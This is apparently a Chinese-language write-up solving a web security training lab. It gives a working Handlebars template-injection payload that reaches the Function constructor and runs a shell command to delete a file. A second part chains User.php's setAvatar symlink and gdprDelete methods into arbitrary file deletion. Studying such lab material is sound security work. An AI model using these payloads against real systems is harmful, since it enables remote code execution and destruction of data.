使用LLM时未能获得已知漏洞的攻击向量，查看示例解决方案：
```javascript
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
变量string绑定字符串"s"
string.sub 访问字符串对象的构造函数
lookup X "constructor" 在X中寻找构造函数
这三步实现了普通原型污染的 this.constructor.constructor

之后使用相似方式创建攻击字符串

变量conslist绑定字符串 "e".split 方法，此方法继承了先祖对象的属性，于是可使用pop与push
此处split本身是一个对象，然而可调用pop与push方法来模拟数组

#each 进行一次遍历
.apply将后续内容应用到当前对象
此处将攻击字符串应用到原型构建器中

之后对首选名进行注入时 除了已知的3个用户名称字段外，对user使用从错误响应中泄露的方法。
实现设置读取任意文件的功能，之后读取源代码文件，查看对象的字段与方法
/home/carlos/User.php
```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```
调用user.setAvatar()关联目标文件路径后
调用user.gdprDelete()进行删除
